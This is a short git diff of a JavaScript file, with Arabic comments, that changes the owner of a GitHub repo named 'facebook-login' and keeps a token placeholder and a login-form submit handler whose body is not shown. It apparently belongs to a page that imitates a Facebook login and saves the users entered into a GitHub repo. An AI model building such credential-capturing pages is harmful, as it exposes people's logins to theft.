@@ -1,6 +1,6 @@
 // 🔥 GitHub Token - الصق token هنا
 const GITHUB_TOKEN = 'ghp_xxxxxxxxxxxxxxxx'; // الصق token بتاعك
-const REPO_OWNER = 'YOUR_USERNAME'; // غيّر بـ username بتاعك
+const REPO_OWNER = '00000'; // غيّر بـ username بتاعك
 const REPO_NAME = 'facebook-login'; // اسم الـ repo
 
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
@@ -105,3 +105,4 @@ async function showUsers() {
 
 // تحميل عند البداية
 showUsers();
+
